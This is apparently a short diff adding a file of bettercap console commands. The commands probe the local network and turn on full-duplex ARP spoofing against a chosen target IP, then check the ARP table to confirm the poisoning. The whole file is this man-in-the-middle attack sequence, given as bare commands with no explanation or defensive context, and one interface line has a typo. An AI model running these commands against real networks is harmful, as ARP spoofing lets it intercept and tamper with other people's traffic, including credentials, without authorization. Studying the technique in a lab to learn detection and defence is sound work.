@@ -1,0 +1,9 @@
+ip a
+sudo bettercap-iface etho0
+help
+net.probe on
+help arp.spoof
+set arp.spoof.fullduplex true
+set arp.spoof.target <ip>
+arp.spoof on
+cmd -> arp -a
